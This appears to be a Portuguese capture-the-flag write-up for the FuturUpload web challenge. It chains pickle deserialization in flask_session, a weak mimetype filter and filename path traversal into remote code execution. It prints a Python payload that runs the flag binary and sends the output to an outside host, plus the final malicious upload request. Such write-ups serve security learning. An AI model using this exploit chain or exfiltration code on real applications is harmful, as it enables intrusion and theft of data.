---
layout: post
title: "FuturUpload - Midnight Flag CTF Quals 2025"
authors:
  - name: apolo2
    social: https://apolo2.xyz
date: 2025-04-16
excerpt: "Solução do desafio FuturUpload do Midnight Flag CTF Quals 2025"
---

## Introdução
Midnight Flag CTF é um CTF organizado pela _ESNA de Bretagne_. A qualificatória da edição de 2025 teve 364 times participantes com ao menos 1 flag; 260 com ao menos 2 flags. [The Flat Network Society](https://ctftime.org/team/87434/) terminou na primeira colocação. [FuturUpload](https://github.com/MidnightFlag/qualifiers-challenges-2025/tree/master/Web/FuturUpload) era o último desafio da categoria web, com a tag `Hard`, sem hints, 497 pontos e 7 solves ao final do evento.

## Challenge
O desafio consiste em um servidor de cloud storage, onde é possível fazer upload de arquivos e criação de pastas. Também há login/registro de usuários, com sessões utilizando o `flask_session`. A flag está em `/flag.txt`.

No `Dockerfile` há:
```
COPY ./flag.txt /root/
COPY ./getflag.c /
RUN gcc /getflag.c -o /getflag && \
chmod u+s /getflag && \
rm /getflag.c
  
WORKDIR /app
COPY ./src/ .
RUN useradd ctf && \
chown -R ctf:ctf /app/flask_session/ && \
chown -R ctf:ctf /app/user_files/

USER ctf
EXPOSE 800
ENTRYPOINT ["python3","app.py"]
```

Daí já surgem alguns pontos importantes:
- conseguir file read não é suficiente: é necessário executar `/getflag` para conseguir a flag; precisa-se de RCE;
- escrita/leitura relevante está restrita a `/app/flask_session/` e `/app/user_files/`.

O compose também é simples: `ports: "8000:8000"` e `restart: unless-stopped`. O servidor, todavia, passava por um reverse proxy.

No entrypoint (`app.py`) há:
```
from flask import Flask
from config import Config
from models import init_db
from flask_session import Session
from routes.views import views_blueprint
from routes.api import auth_api, files_api, folders_api

app = Flask(__name__)
app.config.from_object(Config)
Session(app)
init_db()
  
app.register_blueprint(views_blueprint)
app.register_blueprint(auth_api)
app.register_blueprint(files_api)
app.register_blueprint(folders_api)

app.run(host='0.0.0.0', port=8000, threaded=True)
```

Uma ideia de RCE já surge daí: com a escrita em `flask_session`, pode-se escrever `__init__.py` lá e conseguir a execução por dependency confusion.

**Problema:** `Flask` está sem debug mode e não há WSGI. Como o import acontece no entrypoint do container, é necessário forçar um restart.

`config.py` mostra `DATABASE = ":memory:"` e `models.py` mostra `sqlite3` com queries para registro de usuários com colunas do tipo `TEXT`. Uma ideia é forçar DoS e abusar do `restart: unless-stopped`. Não foi possível.

Outra ideia de RCE: `flask_session` chama `picke.load` em cima das sessões armazenadas (code review). `pickle` é [conhecidamente inseguro](https://docs.python.org/3/library/pickle.html). No arquivo de configuração há `SESSION_TYPE = "filesystem"`: as sessões serão armazenadas em `flask_session`. O servidor tem permissão de escrita em `flask_session`.

**Problema:** um arquivo de sessão tem o formato `md5(SESSION_KEY_PREFIX="session:"+SESSION_ID)`. Embora um usuário saiba seu ID de sessão, o arquivo de configuração define `SESSION_KEY_PREFIX = os.urandom(32).hex()`, inviabilizando sobrescrever seu arquivo de sessão criado pelo `flask_session`.

Mais code review. `Flask` usa um módulo chamado `cachelib`, que usa um arquivo contendo o número de sessões armazenadas: [`__wz_cache_count`](https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/file.py#L50). Os arquivos de `cachelib` também usam MD5, mas não usam o `SESSION_KEY_PREFIX`: isso é do `flask_session`!  Basta escrever um payload para passar pelo `pickle.load` do `flask_session` em `flask_session/md5("__wz_cache_count")="2029240f6d1128be89ddc32729463129"`.

Construir o arquivo é simples e [já conhecido](https://ctftime.org/writeup/40063); basta usar `__reduce__` e colocar um padding de 4 bytes, usados como timestamp. Foi usado exfil OOB da flag com o seguinte script:
```
import subprocess
import urllib.request
import urllib.parse

output = subprocess.check_output(['/getflag'], stderr=subprocess.STDOUT)
flag = output.decode().strip()
encoded_flag = urllib.parse.quote(flag)

url = f"http://ovrdwkexzqwddnkyjctj3v76n1mfyqawm.i.apolo2.xyz/?exfil={encoded_flag}"
req = urllib.request.Request(url, method="POST")
urllib.request.urlopen(req)
```

**Problema**: o RCE ficou trivial, se for possível escrever em `flask_session`. O writeup começou do RCE, mas a escrita ocorre em `user_files` (em config: `UPLOAD_FOLDER = os.path.abspath("user_files")`). Precisa-se de um path traversal.

Code review no fluxo de upload...

**Problema:** só é possível fazer upload de imagens.
```
mimetype, _ = mimetypes.guess_type(filename)
if mimetype not in ['image/png', 'image/jpeg']:
	return jsonify({'status': 'error', 'message': 'Invalid file type'})
```

Esse filtro é bem fraco. O `guess_type` se baseia apenas no `filename`, usar [data URI](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data) é um bypass trivial, mas as pastas precisam existir! A solução é simples: bastar criar as pastas `data:image` e `png,`. A aplicação permite isso.

**Problema:** o path traversal não parece possível.
```
base_path = os.path.join(Config.UPLOAD_FOLDER, user[3])
full_folder = os.path.normpath(os.path.join(base_path, folder))
if not full_folder.startswith(base_path):
	return jsonify({'status': 'error', 'message': 'Invalid folder'})
```

Novamente, outro filtro fraco. Basta migrar o path traversal para o parâmetro `filename`, e deixar `folder=`.

A partir daqui, é só montar o RCE:
- criar 2 pastas aninhadas: `data:image` e `png,`;
- montar um arquivo malicioso para passar pelo `pickle`;
- fazer upload com `folder=&filename=data:image/png,/../../../../flask_session/2029240f6d1128be89ddc32729463129&content=BASE64_PICKE_EXPLOIT`.
